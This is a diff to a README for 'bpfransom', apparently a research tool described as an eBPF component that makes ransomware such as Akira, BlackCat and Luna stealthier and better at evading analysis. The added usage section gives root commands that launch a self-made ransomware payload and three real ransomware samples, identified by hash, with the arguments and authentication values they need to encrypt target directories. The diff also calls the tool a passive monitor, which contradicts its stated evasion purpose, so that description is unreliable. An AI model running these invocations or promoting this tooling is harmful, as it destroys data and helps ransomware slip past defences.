@@ -42,3 +42,64 @@ The eBPF-augmented ransomware prototype that launches ransompayload and provides
 
 ### bpfransom_component
 A reusable eBPF adversarial component that can be integrated into traditional ransomware families such as Akira, BlackCat, and Luna to enhance stealthiness, anti-analysis, and defense evasion capabilities.
+
+
+## 🪄 Usage
+
+Run `bpfransom` with root privileges:
+
+```bash
+sudo ./bpfransom --file <ransomware_binary> --target-args "<args>"
+```
+
+### bpfransom Parameters
+
+| Parameter | Description |
+|-----------|-------------|
+| `--file` | Path to the ransomware binary under test. `bpfransom` attaches eBPF probes to monitor the target's system call behavior at the kernel level without interfering with its execution flow. |
+| `--target-args` | Comma-separated arguments forwarded to the target binary at runtime, simulating the invocation conditions required by each ransomware variant (e.g., encryption scope, session credentials, target directory). |
+
+> **Note:** Root privileges are required to attach eBPF programs to kernel tracepoints for system call interception.
+
+---
+
+### Ransomware Samples
+
+| Binary | Description |
+|--------|-------------|
+| `ransompayload` | A self-developed ransomware prototype used as a baseline test case. |
+| `0ee1d284...` | Real-world Akira ransomware sample identified by its SHA-256 hash. Accepts --id and --path arguments, indicating an ID-authenticated, single-path encryption workflow. |
+| `3a08e3bf...` | Real-world blackcat ransomware sample identified by its SHA-256 hash. Requires an --access-token for authentication and supports path targeting via --paths. |
+| `1cbbf108...` | Real-world luna ransomware sample identified by its SHA-256 hash. Operates in directory-sweep mode, encrypting all files under the specified -dir path. |
+
+---
+
+### Examples
+
+**Self-developed payload — directory mode:**
+```bash
+sudo ./bpfransom \
+  --file ./ransompayload \
+  --target-args "-dir,/home/abc/Downloads/testfile"
+```
+
+**Sample `0ee1d284` — ID-authenticated, single path:**
+```bash
+sudo ./bpfransom \
+  --file ./0ee1d284ed663073872012c7bde7fac5ca1121403f1a5d2d5411317df282796c \
+  --target-args "--id,VDbAYZkdIB,--path,/home/abc/Downloads/testfile"
+```
+
+**Sample `3a08e3bf` — token-authenticated, multi-path:**
+```bash
+sudo ./bpfransom \
+  --file ./3a08e3bfec2db5dbece359ac9662e65361a8625a0122e68b56cd5ef3aedf8ce1 \
+  --target-args "--access-token,123,--paths,/home/abc/Downloads/testfile"
+```
+
+**Sample `1cbbf108` — directory sweep:**
+```bash
+sudo ./bpfransom \
+  --file ./1cbbf108f44c8f4babde546d26425ca5340dccf878d306b90eb0fbec2f83ab51 \
+  --target-args "-dir,/home/wangcheng/abc/testfile"
+```
